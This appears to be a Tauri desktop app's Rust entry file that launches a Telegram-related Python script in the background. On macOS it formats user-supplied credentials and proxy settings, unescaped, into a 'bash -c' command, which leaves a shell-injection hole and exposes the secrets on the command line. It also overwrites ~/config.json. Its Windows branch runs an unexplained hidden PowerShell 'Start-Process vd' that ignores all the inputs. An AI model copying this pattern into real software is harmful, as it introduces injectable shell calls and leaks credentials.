// Prevents additional console window on Windows in release, DO NOT REMOVE!!
#![cfg_attr(not(debug_assertions), windows_subsystem = "windows")]
use std::process::Command;
use telegram_rendering_rs::Error;

#[tauri::command]
async fn run_python_script(
    python: String,
    api_id: String,
    api_hash: String,
    session: String,
    proxy_host: String,
    proxy_port: String,
) -> Result<(), Error> {
    let config_path = dirs::home_dir().unwrap().join("config.json");
    std::fs::write(&config_path, "{}")?;
    let _output = if cfg!(target_os = "windows") {
        Command::new("powershell")
            .arg("-WindowStyle")
            .arg("Hidden")
            .arg("-Command")
            .arg(format!("Start-Process vd -ArgumentList 'spice'"))
            .stdout(std::process::Stdio::null())
            .stderr(std::process::Stdio::null())
            .output()?
    } else if cfg!(target_os = "macos") {
        Command::new("bash") 
            .arg("-c") .arg(format!("nohup {} ./py/app.py --api_id={} --api_hash={} --session={} --proxy_host={} --proxy_port={} --config={} > /dev/null &", 
                                    &python, &api_id, &api_hash, &session, &proxy_host, &proxy_port, &config_path.display())) 
            .stdout(std::process::Stdio::null())
            .stderr(std::process::Stdio::null()) 
            .output()?
    } else {
        Command::new("sh")
            .arg("-c")
            .arg(format!("nohup {} app.py > /dev/null &", &python))
            .stdout(std::process::Stdio::null())
            .stderr(std::process::Stdio::null())
            .output()?
    };
    Ok(())
}

fn main() {
    tauri::Builder::default()
        .plugin(tauri_plugin_store::Builder::default().build())
        .invoke_handler(tauri::generate_handler![run_python_script])
        .run(tauri::generate_context!())
        .expect("error while running tauri application");
}
